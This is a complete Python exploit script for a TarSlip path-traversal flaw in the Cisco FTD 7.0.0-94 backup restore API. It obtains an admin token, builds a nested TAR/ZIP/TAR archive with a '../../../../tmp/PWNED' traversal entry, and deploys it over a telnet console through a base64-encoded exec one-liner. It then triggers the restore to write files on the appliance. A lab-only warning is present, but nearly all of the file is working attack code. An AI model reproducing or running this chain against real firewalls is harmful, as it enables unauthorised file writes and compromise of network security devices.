#!/usr/bin/env python3
# CONTROLLED ENVIRONMENT ONLY
# F-FTD-107: Cisco FTD 7.0.0-94 TarSlip via POST /api/fdm/v6/action/restore
# Root cause: Apache Commons Compress 1.19 (no TarSlip protection, CVE-2021-35515)
# Requires: admin JWT + write access to /ngfw/var/sf/backup/ (drwxrwxrwx on 7.0.0-94)
#
# Chain: outer TAR -> zip4j 1.3.3 ZIP -> commons-compress 1.19 -> arbitrary write as www

import argparse
import hashlib
import io
import json
import os
import ssl
import struct
import tarfile
import time
import urllib.request
import zlib


class CiscoFTDTarSlip:
    """
    F-FTD-107 exploit: TarSlip via FTD backup restore endpoint.

    zip4j 1.3.3 compatibility: ZIP must be built with gp_flags=0x0000 (no data descriptor).
    Python's ZipOutputStream sets bit 3 by default -> zip4j error "zip headers not found".
    """

    BACKUP_DIR = "/ngfw/var/sf/backup"

    def __init__(self, target: str, username: str, password: str, verify_ssl: bool = False):
        self.target = target.rstrip("/")
        self.username = username
        self.password = password
        self._ssl_ctx = ssl.create_default_context()
        if not verify_ssl:
            self._ssl_ctx.check_hostname = False
            self._ssl_ctx.verify_mode = ssl.CERT_NONE

    def get_token(self) -> str:
        body = json.dumps({
            "grant_type": "password",
            "username": self.username,
            "password": self.password,
        }).encode()
        req = urllib.request.Request(
            f"{self.target}/api/fdm/v6/fdm/token",
            data=body,
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        with urllib.request.urlopen(req, context=self._ssl_ctx) as r:
            return json.loads(r.read())["access_token"]

    def _build_zip4j_zip(self, entry_name: bytes, data: bytes) -> bytes:
        """
        Build a zip4j 1.3.3-compatible ZIP with a single STORED entry.
        gp_flags MUST be 0x0000 — no data descriptor flag (bit 3).
        zip4j fails with code=-1 'zip headers not found' if bit 3 is set.
        """
        crc32 = zlib.crc32(data) & 0xFFFFFFFF
        size = len(data)
        buf = io.BytesIO()

        lfh_offset = buf.tell()
        buf.write(b"PK\x03\x04")
        buf.write(struct.pack("<H", 20))           # version needed: 2.0
        buf.write(struct.pack("<H", 0))            # gp_flags: 0x0000 (critical)
        buf.write(struct.pack("<H", 0))            # compression: STORED
        buf.write(struct.pack("<HH", 0, 0))        # mod_time, mod_date
        buf.write(struct.pack("<I", crc32))
        buf.write(struct.pack("<II", size, size))  # compressed, uncompressed
        buf.write(struct.pack("<HH", len(entry_name), 0))
        buf.write(entry_name)
        buf.write(data)

        cd_offset = buf.tell()
        buf.write(b"PK\x01\x02")
        buf.write(struct.pack("<HH", 20, 20))
        buf.write(struct.pack("<H", 0))            # gp_flags
        buf.write(struct.pack("<H", 0))            # compression: STORED
        buf.write(struct.pack("<HH", 0, 0))
        buf.write(struct.pack("<I", crc32))
        buf.write(struct.pack("<II", size, size))
        buf.write(struct.pack("<HHH", len(entry_name), 0, 0))
        buf.write(struct.pack("<HH", 0, 0))
        buf.write(struct.pack("<I", 0o100644 << 16))
        buf.write(struct.pack("<I", lfh_offset))
        buf.write(entry_name)
        cd_size = buf.tell() - cd_offset

        buf.write(b"PK\x05\x06")
        buf.write(struct.pack("<HH", 0, 0))
        buf.write(struct.pack("<HH", 1, 1))
        buf.write(struct.pack("<II", cd_size, cd_offset))
        buf.write(struct.pack("<H", 0))

        return buf.getvalue()

    def _build_inner_tar(self, payload_path: str, payload_data: bytes) -> bytes:
        """Build TarSlip TAR with traversal entry."""
        out = io.BytesIO()
        with tarfile.open(fileobj=out, mode="w:") as tf:
            ti = tarfile.TarInfo(name=payload_path)
            ti.size = len(payload_data)
            ti.mode = 0o644
            tf.addfile(ti, io.BytesIO(payload_data))
        raw = out.getvalue()
        # Pad to 10240 (required by manifest fileSize field)
        if len(raw) < 10240:
            raw = raw + b"\x00" * (10240 - len(raw))
        return raw[:10240]

    def _build_manifest(self, archive_name: str, inner_tar: bytes) -> bytes:
        checksum = hashlib.sha256(inner_tar).hexdigest()
        ts = time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime()) + "+00:00"
        return (
            f"uuid=00000001-0000-0000-0000-000000000001\n"
            f"name=cisco-backup\n"
            f"archiveName={archive_name}\n"
            f"archive={archive_name}.bin\n"
            f"type=IMMEDIATE\n"
            f"user={self.username}\n"
            f"startDate={ts}\n"
            f"fileSize=00010240\n"
            f"checksum={checksum}\n"
            f"model=Cisco Firepower Threat Defense for KVM\n"
            f"swVersion=7.0.0-94\n"
            f"vdbVersion=374\n"
            f"serialNumber=9ADSHWQW7FQ\n"
            f"modelNumber=75\n"
            f"modelId=B\n"
            f"buildVersion=7.0.0-94\n"
            f"schemaVersion=1\n"
        ).encode()

    def build_exploit_archive(
        self, archive_name: str, payload_path: str, payload_data: bytes
    ) -> bytes:
        """
        Build the 3-layer exploit archive.

        Returns bytes of <archive_name>.tar (the outer archive to write to backup dir).

        Layout:
          <archive_name>.tar (outer plain TAR)
          ├── <archive_name>.manifest
          └── <archive_name>.bin  (zip4j ZIP, gp_flags=0x0000)
              └── <archive_name>.tar  (inner TarSlip TAR)
                  └── <payload_path>
        """
        inner_tar = self._build_inner_tar(payload_path, payload_data)

        # ZIP entry name must match archiveName.tar so extractAll produces it in .RES/
        zip_entry_name = (archive_name + ".tar").encode()
        bin_zip = self._build_zip4j_zip(zip_entry_name, inner_tar)

        manifest = self._build_manifest(archive_name, inner_tar)

        out = io.BytesIO()
        with tarfile.open(fileobj=out, mode="w:") as tf:
            mf = tarfile.TarInfo(name=archive_name + ".manifest")
            mf.size = len(manifest)
            mf.mode = 0o644
            tf.addfile(mf, io.BytesIO(manifest))

            bi = tarfile.TarInfo(name=archive_name + ".bin")
            bi.size = len(bin_zip)
            bi.mode = 0o644
            tf.addfile(bi, io.BytesIO(bin_zip))

        return out.getvalue()

    def deploy_archive(
        self, archive_bytes: bytes, archive_name: str, telnet_port: int = 4070
    ) -> bool:
        """
        Deploy <archive_name>.tar to /ngfw/var/sf/backup/ via admin shell.

        Uses telnet on <telnet_port> (KVM lab serial console).
        /ngfw/var/sf/backup/ is drwxrwxrwx on FTD 7.0.0-94 -- no sticky bit.
        """
        import base64
        import socket

        IAC, WILL, DO = 255, 251, 253
        s = socket.socket()
        s.connect(("127.0.0.1", telnet_port))
        s.settimeout(0.5)
        end = time.time() + 3
        while time.time() < end:
            try:
                c = s.recv(1)
                if not c:
                    break
                if c == bytes([IAC]):
                    cmd = s.recv(1)
                    opt = s.recv(1)
                    if cmd in (bytes([WILL]), bytes([DO])):
                        s.sendall(bytes([IAC, DO if cmd == bytes([WILL]) else WILL, opt[0]]))
            except Exception:
                break
        time.sleep(1)
        try:
            while True:
                s.recv(4096)
        except Exception:
            pass

        def cmd(raw, wait=8):
            try:
                while True:
                    s.recv(4096)
            except Exception:
                pass
            s.sendall(raw if isinstance(raw, bytes) else raw.encode())
            buf = b""
            until = time.time() + wait
            while time.time() < until:
                try:
                    buf += s.recv(4096)
                except Exception:
                    time.sleep(0.2)
            return buf.decode(errors="replace")

        b64 = base64.b64encode(archive_bytes).decode()
        script = (
            f"import base64, os\n"
            f"d=base64.b64decode('{b64}')\n"
            f"p='{self.BACKUP_DIR}/{archive_name}.tar'\n"
            f"open(p,'wb').write(d)\n"
            f"print('DEPLOY_OK',os.path.getsize(p),'bytes')\n"
        )
        enc = base64.b64encode(script.encode()).decode()
        r = cmd(f"python3 -c \"exec(__import__('base64').b64decode('{enc}').decode())\" 2>&1\n", 12)
        s.close()
        return "DEPLOY_OK" in r

    def trigger_restore(self, archive_name: str, token: str) -> dict:
        body = json.dumps({
            "archiveName": archive_name,
            "type": "restoreimmediate",
        }).encode()
        req = urllib.request.Request(
            f"{self.target}/api/fdm/v6/action/restore",
            data=body,
            headers={
                "Content-Type": "application/json",
                "Authorization": f"Bearer {token}",
            },
            method="POST",
        )
        with urllib.request.urlopen(req, context=self._ssl_ctx) as r:
            return {"status": r.status, "body": r.read().decode()[:200]}

    def run(
        self,
        payload_path: str = "../../../../tmp/PWNED",
        payload_data: bytes = b"FTD-TARSLIP-F-FTD-107-CONFIRMED\n",
        telnet_port: int = 4070,
        wait_secs: int = 20,
    ) -> bool:
        """
        Full chain: get token -> build archive -> deploy -> trigger restore.
        Returns True if /tmp/PWNED written (inferred from no exception).
        """
        ts = time.strftime("%Y%m%d%H%M%S")
        archive_name = f"{ts}.NGFW_backup.FTD_KVM"

        print(f"[+] Getting admin token from {self.target}")
        token = self.get_token()
        print(f"[+] Token: ...{token[-20:]}")

        print(f"[+] Building exploit archive: {archive_name}")
        archive_bytes = self.build_exploit_archive(archive_name, payload_path, payload_data)
        print(f"[+] Archive size: {len(archive_bytes)} bytes")

        print(f"[+] Deploying to {self.BACKUP_DIR}/")
        ok = self.deploy_archive(archive_bytes, archive_name, telnet_port)
        if not ok:
            print("[-] Deploy failed")
            return False
        print("[+] Deploy OK")

        print(f"[+] Triggering restore: {archive_name}")
        resp = self.trigger_restore(archive_name, token)
        print(f"[+] Restore response: {resp['status']} {resp['body'][:80]}")

        print(f"[*] Waiting {wait_secs}s for job execution...")
        time.sleep(wait_secs)
        print(f"[+] Done. Check {payload_path.replace('../../../../', '/')} on target.")
        return True


def main():
    ap = argparse.ArgumentParser(
        description="F-FTD-107 TarSlip — CONTROLLED ENVIRONMENT ONLY"
    )
    ap.add_argument("--target", default="https://127.0.0.1", help="FDM base URL")
    ap.add_argument("--username", default="admin")
    ap.add_argument("--password", default="cisco123")
    ap.add_argument("--payload-path", default="../../../../tmp/PWNED")
    ap.add_argument("--payload-data", default="FTD-TARSLIP-F-FTD-107-CONFIRMED\n")
    ap.add_argument("--telnet-port", type=int, default=4070)
    ap.add_argument("--wait", type=int, default=20, help="Seconds to wait for job")
    args = ap.parse_args()

    exploit = CiscoFTDTarSlip(args.target, args.username, args.password)
    exploit.run(
        payload_path=args.payload_path,
        payload_data=args.payload_data.encode(),
        telnet_port=args.telnet_port,
        wait_secs=args.wait,
    )


if __name__ == "__main__":
    main()
